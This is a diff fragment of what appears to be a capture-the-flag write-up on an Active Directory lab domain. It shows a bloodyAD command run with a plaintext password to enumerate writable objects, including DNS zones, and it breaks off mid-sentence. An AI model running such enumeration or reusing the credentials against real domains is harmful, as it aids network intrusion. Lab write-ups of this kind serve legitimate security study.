@@ -733,3 +733,22 @@ Now ill attempt to connect to winrm on both users to find the user flag!
 
 I found the user flag in `daniel.brooks` desktop
 
+# Enumeration of `ryan.collins` and `daniel.brooks`
+
+```python
+bloodyAD --host dc.novaforge.local -d novaforge.local -u daniel.brooks -p 'Password123!' get writable
+
+distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=novaforge,DC=local
+permission: WRITE
+
+distinguishedName: CN=daniel.brooks,OU=Tier1-Support,DC=novaforge,DC=local
+permission: WRITE
+
+distinguishedName: DC=novaforge.local,CN=MicrosoftDNS,DC=DomainDnsZones,DC=novaforge,DC=local
+permission: CREATE_CHILD; WRITE
+
+distinguishedName: DC=_msdcs.novaforge.local,CN=MicrosoftDNS,DC=ForestDnsZones,DC=novaforge,DC=local
+permission: CREATE_CHILD
+```
+
+This user has write on `DC=novaforge.local,CN=MicrosoftDNS,DC=DomainDnsZones,DC=novaforge,DC=local` which could be intere
